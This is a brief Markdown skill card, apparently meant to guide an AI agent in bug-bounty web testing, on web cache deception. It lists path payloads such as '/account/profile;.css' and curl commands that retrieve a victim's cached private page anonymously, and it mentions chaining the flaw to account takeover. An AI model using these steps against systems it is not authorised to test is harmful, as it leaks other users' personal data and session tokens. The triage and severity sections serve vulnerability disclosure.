# SKILL: Web Cache Deception

## Version: 1.0 | Domain: web | Trigger: `WEB MODE` + (web cache deception) or pasted request matching this class

---

## IDENTITY IN THIS SKILL
Cache rules cache by extension; `/account.css` wraps `/account` → static cache stores authenticated content. Random user fetches `/account.css` → gets victim's data.

---

## DETECTION
Find a path that returns dynamic content but URL has cached extension.

## EXPLOITATION
- Visit `/account/profile.css` (or `.jpg`, `.js`, `.svg`) while logged in. Backend ignores extension, returns dynamic content. CDN caches it.
- Wait briefly. Anonymous request to same URL retrieves cached private response.

Alternative paths:
```
/account/profile;.css
/account/profile.css?cache-bypass-bypass=1
/account/profile/foo.css
/account/profile.css/anything
```

## PAYLOADS (real, copy-paste, grouped)
(see exploitation)

## BYPASS TECHNIQUES
Cache key includes query string → use static file extension only.

## CHAIN POTENTIAL
Cache deception → session token / PII leak → ATO.

## TOOLS
manual

## COMMANDS
```bash
curl -sk -H "Cookie: session=$VICTIM" https://target/account/profile.css
curl -sk https://target/account/profile.css   # different IP / no cookie — should 200 with victim PII
```

## EDGE CASES / NOT-A-BUG TRAPS
Cloudflare patched generic path cache deception in 2020; vendor-specific configs still vulnerable.

## TRIAGE ANGLE (per platform)
Show victim's PII fetched anonymously.

## SEVERITY & CVSS
8.5–9.5.

## REFERENCES
Omer Gil cache deception
